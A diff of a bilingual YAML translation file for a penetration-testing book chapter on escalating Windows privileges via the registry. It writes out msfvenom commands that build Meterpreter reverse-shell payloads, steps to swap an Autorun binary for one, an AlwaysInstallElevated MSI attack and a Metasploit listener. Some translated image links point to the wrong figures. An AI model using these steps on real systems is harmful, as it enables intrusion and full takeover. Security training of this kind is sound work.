@@ -1,310 +1,453 @@
 - en: '*Chapter 9*: Privilege Escalation through the Windows Registry'
+  id: totrans-0
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: '*第 9 章*：通过 Windows 注册表进行权限提升'
 - en: 'You should now have a good grasp of how to identify and perform some of the
     most important privilege escalation techniques on Windows. However, one final
     piece of this puzzle remains: the Windows Registry. In this chapter, we will look
     at how to elevate privileges on the target system by leveraging misconfigurations
     and weaknesses in the Windows Registry.'
+  id: totrans-1
   prefs: []
   type: TYPE_NORMAL
+  zh: 您现在应该已经掌握如何识别和执行一些最重要的 Windows 权限提升技术。然而，这个谜题的最后一块拼图依然存在：Windows 注册表。在本章中，我们将探讨如何通过利用
+    Windows 注册表中的配置错误和弱点来提升目标系统的权限。
 - en: We will explore the process of identifying misconfigurations in the registry,
     utilizing the Autorun functionality, exploiting weak registry permissions, and
     the AlwaysInstallElevated feature to elevate our privileges. We will also provide
     a brief overview of the Windows Registry to understand its purpose and functionality.
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们将探索识别注册表中配置错误的过程，利用自动运行功能，利用注册表权限的薄弱环节，以及 AlwaysInstallElevated 功能来提升我们的权限。我们还将简要概述
+    Windows 注册表，以帮助理解其目的和功能。
 - en: 'In this chapter, we''re going to cover the following main topics:'
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将涵盖以下主要主题：
 - en: Understanding the Windows Registry
+  id: totrans-4
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 理解 Windows 注册表
 - en: Exploiting Autorun programs
+  id: totrans-5
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用自动运行程序
 - en: Exploiting the AlwaysInstallElevated feature
+  id: totrans-6
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用 AlwaysInstallElevated 功能
 - en: Exploiting weak registry permissions
+  id: totrans-7
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用弱注册表权限
 - en: Technical requirements
+  id: totrans-8
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 技术要求
 - en: 'To follow along with the demonstrations in this chapter, you will need to ensure
     that you meet the following technical requirements:'
+  id: totrans-9
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了跟上本章的演示，您需要确保满足以下技术要求：
 - en: Familiarity with Windows CMD commands
+  id: totrans-10
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 熟悉 Windows CMD 命令
 - en: Familiarity with the Windows Registry
+  id: totrans-11
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 熟悉 Windows 注册表
 - en: 'You can view this chapter''s code in action here: [https://bit.ly/3oga2ji](https://bit.ly/3oga2ji)'
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: 您可以在这里查看本章代码的实际应用：[https://bit.ly/3oga2ji](https://bit.ly/3oga2ji)
 - en: Understanding the Windows Registry
+  id: totrans-13
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 理解 Windows 注册表
 - en: Before we can dig into the meat and potatoes of this chapter, we must have a
     functional understanding of the Windows Registry, what it is used for, and how
     it works.
+  id: totrans-14
   prefs: []
   type: TYPE_NORMAL
+  zh: 在深入本章的核心内容之前，我们必须对 Windows 注册表有一定的理解，知道它是做什么的，以及它如何工作。
 - en: This information will prove useful in the latter sections of this chapter and
     will provide a much better context of what we are doing, as well as what we want
     to achieve, when we utilize various privilege escalation techniques.
+  id: totrans-15
   prefs: []
   type: TYPE_NORMAL
+  zh: 这些信息将在本章后续部分中派上用场，并且在我们利用各种权限提升技术时，能提供一个更好的上下文，帮助我们了解正在做的事情以及我们希望实现的目标。
 - en: What is the Windows Registry?
+  id: totrans-16
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 什么是 Windows 注册表？
 - en: Simply put, the Windows Registry is a hierarchical database that is responsible
     for storing configurations, settings, and values for applications, hardware, and
     the Windows operating system. In the context of programs and applications, the
     registry is also used to store program and application data relevant to the configuration
     and operation of the program.
+  id: totrans-17
   prefs: []
   type: TYPE_NORMAL
+  zh: 简单来说，Windows 注册表是一个层次化的数据库，负责存储应用程序、硬件和 Windows 操作系统的配置、设置和值。在程序和应用程序的上下文中，注册表还用于存储与程序配置和操作相关的程序和应用程序数据。
 - en: Given the centralized nature of the Windows Registry and the data it stores,
     it is a prime target for penetration testers during the privilege escalation process.
     This is because it can reveal information about the operating system's configuration
     and the configuration of the programs that have been installed on the target system.
     These configurations can reveal potential weaknesses in various Windows services,
     such as the Autorun feature.
+  id: totrans-18
   prefs: []
   type: TYPE_NORMAL
+  zh: 由于 Windows 注册表的集中性质及其存储的数据，它是渗透测试人员在权限提升过程中主要的目标。这是因为它可以揭示操作系统配置和已安装程序的配置信息，这些配置可能暴露出
+    Windows 服务的潜在弱点，比如自动运行功能。
 - en: In [*Chapter 4*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058), *Performing
     Local Enumeration*, we explored various enumeration techniques that can be used
     to exfiltrate important and useful data from the registry primarily pertaining
     to application passwords. However, we did not explore the process of enumerating
     important operating system configurations that can be used to exploit services
     and other Windows features.
+  id: totrans-19
   prefs: []
   type: TYPE_NORMAL
+  zh: 在[*第 4 章*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058)，*执行本地枚举*中，我们探讨了可以用来从注册表中提取重要和有用数据的各种枚举技术，主要涉及应用程序密码。然而，我们没有探讨枚举操作系统配置的过程，而这些配置可以用来利用服务和其他
+    Windows 特性。
 - en: In this chapter, we will be exploring the process of identifying these operating
     system misconfigurations in the Windows Registry and how they can be leveraged
     to elevate our privileges.
+  id: totrans-20
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将探索在Windows注册表中识别操作系统配置错误的过程，以及如何利用这些错误来提升我们的权限。
 - en: Note
+  id: totrans-21
   prefs: []
   type: TYPE_NORMAL
+  zh: 注意
 - en: Note that programs and applications are not required to store configurations
     in the Windows Registry and may opt to store them within the program installation
     directory. You must keep this in mind when searching for misconfigurations and
     vulnerabilities in programs and applications.
+  id: totrans-22
   prefs: []
   type: TYPE_NORMAL
+  zh: 请注意，程序和应用程序并不要求将配置存储在Windows注册表中，它们可能选择将配置存储在程序安装目录中。在搜索程序和应用程序中的配置错误和漏洞时，必须记住这一点。
 - en: 'We can access the Windows Registry on a Windows system by running the **regedit.exe**
     executable. This can be done through the Windows Command Prompt or the **Run**
     utility, as highlighted in the following screenshot:'
+  id: totrans-23
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以通过运行**regedit.exe**可执行文件来访问Windows注册表。可以通过Windows命令提示符或**运行**工具来完成，如下图所示：
 - en: '![Figure 9.1 – Launching regedit.exe'
+  id: totrans-24
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图9.1 – 启动regedit.exe'
 - en: '](Images/B17389_09_001.jpg)'
+  id: totrans-25
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_001.jpg)'
 - en: Figure 9.1 – Launching regedit.exe
+  id: totrans-26
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.1 – 启动regedit.exe
 - en: Note
+  id: totrans-27
   prefs: []
   type: TYPE_NORMAL
+  zh: 注意
 - en: The Windows Registry Editor (**regedit.exe**), is a built-in Windows executable
     that is used to interact with the Windows Registry and allows users to view and
     edit registry entries.
+  id: totrans-28
   prefs: []
   type: TYPE_NORMAL
+  zh: Windows注册表编辑器（**regedit.exe**）是Windows内置的可执行文件，用于与Windows注册表交互，允许用户查看和编辑注册表条目。
 - en: 'As shown in the following screenshot, the Windows Registry uses a hierarchical
     sorting system that categorizes data as keys and values based on its functionality
     and purpose:'
+  id: totrans-29
   prefs: []
   type: TYPE_NORMAL
+  zh: 如下图所示，Windows注册表使用层级排序系统，根据功能和目的将数据分类为键和值：
 - en: '![Figure 9.2 – Registry Editor'
+  id: totrans-30
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图9.2 – 注册表编辑器'
 - en: '](Images/B17389_09_002.jpg)'
+  id: totrans-31
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_002.jpg)'
 - en: Figure 9.2 – Registry Editor
+  id: totrans-32
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.2 – 注册表编辑器
 - en: The Windows Registry Editor displays various keys that contain their respective
     values. Now, let's take a look at how these keys and values are stored and categorized.
+  id: totrans-33
   prefs: []
   type: TYPE_NORMAL
+  zh: Windows注册表编辑器显示了包含各自值的各种键。现在，让我们来看看这些键和值是如何存储和分类的。
 - en: How the Windows Registry stores data
+  id: totrans-34
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: Windows注册表如何存储数据
 - en: The Windows Registry operates under a key/value system, where entries store
     their data in the form of a key and data pair.
+  id: totrans-35
   prefs: []
   type: TYPE_NORMAL
+  zh: Windows注册表在键/值系统下运行，其中条目以键和值对的形式存储其数据。
 - en: To understand how keys and values work in the context of the Windows Registry,
     we can use the categorization analogy of folders and files, where keys are folders
     and values are files.
+  id: totrans-36
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了理解在Windows注册表中键和值如何工作，我们可以使用文件夹和文件的分类类比，其中键是文件夹，值是文件。
 - en: 'The Windows Registry Editor displays a categorized list of root keys that contain
     all the registry values on the system. The following table provides a description
     of each root key, its abbreviation, and the nature of the respective values it
     stores:'
+  id: totrans-37
   prefs: []
   type: TYPE_NORMAL
+  zh: Windows注册表编辑器显示了根键的分类列表，根键包含系统上的所有注册表值。下表提供了每个根键的描述、缩写以及它所存储的相应值的性质：
 - en: '![](Images/B17389_09_table_01.jpg)'
+  id: totrans-38
   prefs: []
   type: TYPE_IMG
+  zh: '![](Images/B17389_09_table_01.jpg)'
 - en: Now that you understand how the Windows Registry stores data, the various root
     keys, and the type of information they store, we can begin exploring the process
     of identifying operating misconfigurations in the Windows Registry.
+  id: totrans-39
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在您了解了Windows注册表如何存储数据、各种根键以及它们存储的信息类型，我们可以开始探索识别Windows注册表中操作性配置错误的过程。
 - en: This process is dynamic and, as a result, will depend on the target configuration
     and deployment use case, primarily because the techniques involved in this process
     will depend on the implementation and configuration of particular services.
+  id: totrans-40
   prefs: []
   type: TYPE_NORMAL
+  zh: 该过程是动态的，因此将依赖于目标配置和部署使用案例，主要是因为这一过程中涉及的技术将取决于特定服务的实现和配置。
 - en: Given the robust nature of this process and the techniques used, we will be
     utilizing the Windows 7 virtual machine that we configured in [*Chapter 8*](B17389_08_Final_PG_ePub.xhtml#_idTextAnchor114),
     *Exploiting Services*. This has been configured with vulnerable services and configurations.
+  id: totrans-41
   prefs: []
   type: TYPE_NORMAL
+  zh: 考虑到该过程的强大性质和所使用的技术，我们将使用在[*第8章*](B17389_08_Final_PG_ePub.xhtml#_idTextAnchor114)中配置的Windows
+    7虚拟机，*利用服务*。该虚拟机已配置了存在漏洞的服务和配置。
 - en: Before we begin, ensure that you have a foothold on the target system and have
     access to it through a command shell or Meterpreter session.
+  id: totrans-42
   prefs: []
   type: TYPE_NORMAL
+  zh: 在我们开始之前，请确保您已在目标系统上占据了一定位置，并通过命令行或Meterpreter会话访问目标系统。
 - en: The techniques and tools used in this chapter will involve utilizing native
     Windows commands and specific Meterpreter modules to automate various aspects
     of the process.
+  id: totrans-43
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章中使用的技术和工具将涉及利用本地 Windows 命令和特定 Meterpreter 模块来自动化过程的各个方面。
 - en: We will begin by looking at how to identify and exploit Autorun programs in
     order to elevate our privileges.
+  id: totrans-44
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们将首先看看如何识别和利用 Autorun 程序以提升我们的特权。
 - en: Exploiting Autorun programs
+  id: totrans-45
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 利用 Autorun 程序
 - en: Autorun is a Windows feature that is used to automatically start applications
     and programs during system startup.
+  id: totrans-46
   prefs: []
   type: TYPE_NORMAL
+  zh: Autorun 是 Windows 的一个功能，用于在系统启动期间自动启动应用程序和程序。
 - en: Autorun is a companion feature to AutoPlay that is typically used to automate
     the startup of setup files for specific programs. This helps streamline the installation
     of new software when the installation media is inserted into the system.
+  id: totrans-47
   prefs: []
   type: TYPE_NORMAL
+  zh: Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程序的安装文件。这有助于在将安装介质插入系统时简化新软件的安装过程。
 - en: Programs and software can be configured to run on system startup with the Autorun
     feature.
+  id: totrans-48
   prefs: []
   type: TYPE_NORMAL
+  zh: 程序和软件可以配置为使用 Autorun 功能在系统启动时运行。
 - en: The Autorun feature is disabled by default in newer versions of Windows such
     as Windows 10; however, Microsoft has provided users with the ability to enable
     it. This technique will require the Autorun feature to be enabled on the target.
+  id: totrans-49
   prefs: []
   type: TYPE_NORMAL
+  zh: 新版 Windows（如 Windows 10）默认情况下禁用了 Autorun 功能；但是，Microsoft 已经为用户提供了启用它的功能。此技术将需要在目标上启用
+    Autorun 功能。
 - en: We can elevate our privileges through Autorun by identifying programs that have
     been configured to run on system startup, as well as those that can be run by
     users with administrative privileges. We can then use these to elevate our privileges.
+  id: totrans-50
   prefs: []
   type: TYPE_NORMAL
+  zh: 通过识别已配置在系统启动时运行的程序以及可以由具有管理权限的用户运行的程序，我们可以通过 Autorun 来提升我们的特权。然后我们可以利用这些来提升我们的特权。
 - en: 'This process can be performed completing the following steps:'
+  id: totrans-51
   prefs: []
   type: TYPE_NORMAL
+  zh: 可以通过完成以下步骤执行此过程：
 - en: 'The first step in this process involves identifying Autorun applications on
     the target system. This can be done by running the following command in the Windows
     command shell:'
+  id: totrans-52
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 这个过程的第一步涉及识别目标系统上的 Autorun 应用程序。可以通过在 Windows 命令 shell 中运行以下命令来完成：
 - en: '**reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run**'
+  id: totrans-53
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run**'
 - en: 'As highlighted in the following screenshot, this will display a list of Autorun
     applications:'
+  id: totrans-54
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下截图所示，这将显示一个 Autorun 应用程序列表：
 - en: '![Figure 9.3 – Windows Registry Autorun programs'
+  id: totrans-55
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 9.3 – Windows 注册表 Autorun 程序'
 - en: '](Images/B17389_09_003.jpg)'
+  id: totrans-56
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_003.jpg)'
 - en: Figure 9.3 – Windows Registry Autorun programs
+  id: totrans-57
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 9.3 – Windows 注册表 Autorun 程序
 - en: 'We can also identify applications that have been configured for Autorun and
     their respective permissions by using the **accesschk** utility. The **accesschk**
     executable can be downloaded from here: [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk).'
+  id: totrans-58
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 我们还可以使用 **accesschk** 实用程序识别已配置为 Autorun 的应用程序及其各自的权限。可以从这里下载 **accesschk**
+    可执行文件：[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)。
 - en: 'After downloading the **accesschk** executable to our Kali virtual machine,
     we will need to transfer it to the target system. This can be done through Meterpreter
     by running the following command:'
+  id: totrans-59
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 将 **accesschk** 可执行文件下载到我们的 Kali 虚拟机后，我们需要将其传输到目标系统。可以通过 Meterpreter 运行以下命令完成：
 - en: '**upload /<PATH-TO-EXECUTABLE/accesschk64.exe**'
+  id: totrans-60
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**upload /<PATH-TO-EXECUTABLE/accesschk64.exe**'
 - en: If you are using a standard command shell, you can use the **certutil** utility
     to transfer the binary to the target system.
+  id: totrans-61
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如果使用标准命令 shell，可以使用 **certutil** 实用程序将二进制文件传输到目标系统。
 - en: 'After uploading the **accesschk.exe** binary to the target system, we can enumerate
     a list of all Autoruns programs by running the following command in the Windows
     command shell:'
+  id: totrans-62
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在将 **accesschk.exe** 二进制文件上传到目标系统后，我们可以通过在 Windows 命令 shell 中运行以下命令来枚举所有 Autorun
+    程序的列表：
 - en: '**.\accesschk64.exe -wvu "c:\Program Files\ Autorun Program"**'
+  id: totrans-63
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**.\accesschk64.exe -wvu "c:\Program Files\ Autorun Program"**'
 - en: 'As highlighted in the following screenshot, this will highlight a list of Autorun
     programs, their access permissions, and their respective directories:'
+  id: totrans-64
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下截图所示，这将突出显示一个 Autorun 程序列表、它们的访问权限以及各自的目录：
 - en: Note
+  id: totrans-65
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 注意
 - en: '**RW** indicates that the groups have read and write permissions and, as a
     result, can make changes to the contents of the program directory.'
+  id: totrans-66
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.4 – accesschk Autorun programs](Images/B17389_09_004.jpg)'
+  id: totrans-67
   prefs:
   - PREF_IND
   type: TYPE_IMG
 - en: Figure 9.4 – accesschk Autorun programs
+  id: totrans-68
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
@@ -314,49 +457,59 @@
     by replacing the program executable with a Meterpreter shell executable that will
     be automatically executed when the administrator logs in, providing us with an
     elevated Meterpreter session.
+  id: totrans-69
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: The next step will involve generating the reverse shell executable and uploading
     it to the target system.
+  id: totrans-70
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-71
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: This privilege escalation technique requires the administrator to log on to
     the system for the Autorun program to be executed.
+  id: totrans-72
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'We can generate the Meterpreter payload with **msfvenom** and save it as an
     executable. This can be done by running the following command in Kali:'
+  id: totrans-73
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER-IP> LPORT=<PORT>
     -f exe > /home/kali/Desktop/program.exe**'
+  id: totrans-74
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-75
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: The reverse shell payload should have the same name of the program we are trying
     to exploit, and it should be uploaded to the respective service path we identified
     earlier and highlighted here.
+  id: totrans-76
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'After generating the payload, we can upload it to the target Autorun application
     path, which is as follows:'
+  id: totrans-77
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: C:\Program Files\Autorun Program\
+  id: totrans-78
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
@@ -364,409 +517,532 @@
     binary. However, it is recommended to take a backup of the original binary in
     the event the process does not work as expected. The original executable can be
     renamed by running the following command in the Meterpreter session:'
+  id: totrans-79
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**mv program.exe program_backup.exe**'
+  id: totrans-80
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Now, we can upload the Meterpreter executable to the target Autorun program
     directory on the target using Meterpreter by running the following command:'
+  id: totrans-81
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**upload /home/kali/Desktop/program.exe**'
+  id: totrans-82
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: If you are using a standard command shell, you can use the **certutil** utility
     to transfer the binary to the target system.
+  id: totrans-83
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'As highlighted in the following screenshot, this will upload the Meterpreter
     executable to the **Autorun Program** directory:'
+  id: totrans-84
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.5 – Uploading a custom Autorun program'
+  id: totrans-85
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_005.jpg)'
+  id: totrans-86
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 9.5 – Uploading a custom Autorun program
+  id: totrans-87
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Now, we need to set up the Meterpreter listener with Metasploit. This can be
     done by running the following command in the Metasploit console:'
+  id: totrans-88
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**use /exploit/multi/handler**'
+  id: totrans-89
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'The next step involves specifying the payload we used to create the binary
     with MSFvenom. This can be done by running the following command:'
+  id: totrans-90
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
+  id: totrans-91
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Now, we need to configure the module options. In this case, we need to configure
     the **LHOST** and **LPORT** options, as highlighted in the following screenshot:'
+  id: totrans-92
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.6 – Meterpreter payload options'
+  id: totrans-93
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 9.6 – Meterpreter负载选项](Images/B17389_09_008.jpg)'
 - en: '](Images/B17389_09_006.jpg)'
+  id: totrans-94
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_006.jpg)'
 - en: Figure 9.6 – Meterpreter payload options
+  id: totrans-95
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 9.6 – Meterpreter负载选项
 - en: 'After setting the module options, we can start the listener by running the
     following command:'
+  id: totrans-96
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 在设置模块选项后，我们可以通过运行以下命令启动监听器：
 - en: '**run**'
+  id: totrans-97
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**run**'
 - en: The listener will listen for any incoming connections from the payload we generated
     with MSFvenom.
+  id: totrans-98
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 监听器将监听我们通过MSFvenom生成的负载发出的任何传入连接。
 - en: 'Our custom Autorun program will be executed automatically the next time the
     administrator logs in, after which we should receive a privileged Meterpreter
     session, as highlighted in the following screenshot:'
+  id: totrans-99
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 我们的自定义自动运行程序将在管理员下次登录时自动执行，之后我们应该会收到一个特权的Meterpreter会话，如下截图所示：
 - en: '![Figure 9.7 – Autorun Meterpreter session'
+  id: totrans-100
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 9.7 – 自动运行Meterpreter会话](Images/B17389_09_007.jpg)'
 - en: '](Images/B17389_09_007.jpg)'
+  id: totrans-101
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_007.jpg)'
 - en: Figure 9.7 – Autorun Meterpreter session
+  id: totrans-102
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 9.7 – 自动运行Meterpreter会话
 - en: With that, we have successfully elevated our privileges by leveraging an Autorun
     program with misconfigured permissions.
+  id: totrans-103
   prefs: []
   type: TYPE_NORMAL
+  zh: 有了这个，我们成功地通过利用具有配置错误权限的自动运行程序提升了我们的权限。
 - en: Exploiting the Always Install Elevated feature
+  id: totrans-104
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 利用Always Install Elevated功能
 - en: AlwaysInstallElevated is a Windows feature that allows standard user accounts
     with no administrative privileges to install software packaged in the **Microsoft
     Windows Installer** (**MSI**) format with administrative privileges.
+  id: totrans-105
   prefs: []
   type: TYPE_NORMAL
+  zh: AlwaysInstallElevated是一个Windows功能，它允许没有管理员权限的标准用户帐户以管理员权限安装打包为**Microsoft Windows
+    Installer**（**MSI**）格式的软件。
 - en: We can leverage this configuration to elevate our privileges by generating a
     custom executable with the MSI format. Then, we can utilize the **msiexec** utility
     to execute the MSI executable, which will give us an elevated session.
+  id: totrans-106
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以利用这个配置通过生成一个自定义的MSI格式可执行文件来提升我们的权限。然后，我们可以使用**msiexec**工具执行该MSI可执行文件，从而获得提升的会话。
 - en: This feature is commonly misconfigured in companies and organizations, primarily
     for ease of access for employees or is mistakenly left enabled by administrators
     after setting up a workstation. Either way, this technique will allow us to elevate
     our privileges in a relatively straightforward manner.
+  id: totrans-107
   prefs: []
   type: TYPE_NORMAL
+  zh: 该功能在公司和组织中常常配置错误，主要是为了方便员工访问，或者管理员在设置工作站后错误地将其启用。无论哪种情况，这项技术都能让我们以相对简单的方式提升权限。
 - en: The Always Install Elevated feature is configured in the Windows Registry and
     as a result, we can query the registry to determine whether the feature is enabled
     before we begin the privilege escalation process.
+  id: totrans-108
   prefs: []
   type: TYPE_NORMAL
+  zh: Always Install Elevated功能配置在Windows注册表中，因此我们可以查询注册表以确定该功能是否启用，然后再开始权限提升过程。
 - en: Let's look at how to perform this technique both manually and automatically
     with the Metasploit framework.
+  id: totrans-109
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们来看看如何使用Metasploit框架手动和自动执行此技术。
 - en: Note
+  id: totrans-110
   prefs: []
   type: TYPE_NORMAL
+  zh: 注意
 - en: If this feature is not enabled on the target system, this technique will not
     work.
+  id: totrans-111
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果目标系统未启用此功能，则此技术将无法工作。
 - en: 'To perform this technique, follow these steps:'
+  id: totrans-112
   prefs: []
   type: TYPE_NORMAL
+  zh: 要执行此技术，请按以下步骤操作：
 - en: 'The first step involves identifying whether the AlwaysInstallElevated feature
     is enabled on the target system. This can be done by running the following registry
     queries in the Windows command shell:'
+  id: totrans-113
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 第一步是确定目标系统是否启用了AlwaysInstallElevated功能。可以通过在Windows命令行中运行以下注册表查询来完成：
 - en: '**reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**'
+  id: totrans-114
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**'
 - en: '**reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**'
+  id: totrans-115
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**'
 - en: 'As highlighted in the following screenshot, this will output the registry configuration
     for the AlwaysInstallElevated feature and its value. If the highlighted value
     in the following screenshot is set to **0**, the feature is disabled, while if
     the value is set to **1**, the feature is enabled:'
+  id: totrans-116
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下截图所示，这将输出AlwaysInstallElevated功能的注册表配置及其值。如果以下截图中突出显示的值设置为**0**，则该功能被禁用；如果值设置为**1**，则该功能已启用：
 - en: '![Figure 9.8 – Registry query – AlwaysInstallElevated'
+  id: totrans-117
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 9.8 – 注册表查询 – AlwaysInstallElevated](Images/B17389_09_006.jpg)'
 - en: '](Images/B17389_09_008.jpg)'
+  id: totrans-118
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_008.jpg)'
 - en: Figure 9.8 – Registry query – AlwaysInstallElevated
+  id: totrans-119
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 9.8 – 注册表查询 – AlwaysInstallElevated
 - en: In this case, we determined that the AlwaysInstallElevated feature is enabled
     and can therefore be leveraged to elevate our privileges.
+  id: totrans-120
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在本例中，我们确定AlwaysInstallElevated功能已启用，因此可以利用该功能提升我们的权限。
 - en: 'The second step in the process will involve generating the custom MSI executable
     with MSFvenom. This can be done by running the following command in Kali:'
+  id: totrans-121
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT>
     -f msi > setup.msi**'
+  id: totrans-122
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'After generating the payload, we can upload it to the Windows temporary directory,
     which can be found here:'
+  id: totrans-123
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: C:\Temp
+  id: totrans-124
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Now, we can upload the custom MSI executable to the temporary directory on
     the target using Meterpreter by running the following command:'
+  id: totrans-125
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '**upload /home/kali/Desktop/setup.msi**'
+  id: totrans-126
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: If you are using a standard command shell, you can use the **certutil** utility
     to transfer the binary to the target system.
+  id: totrans-127
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'As shown in the following screenshot, this will upload the Meterpreter executable
     to the **Autorun Program** directory:'
+  id: totrans-128
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.9 – Meterpreter – upload custom MSI'
+  id: totrans-129
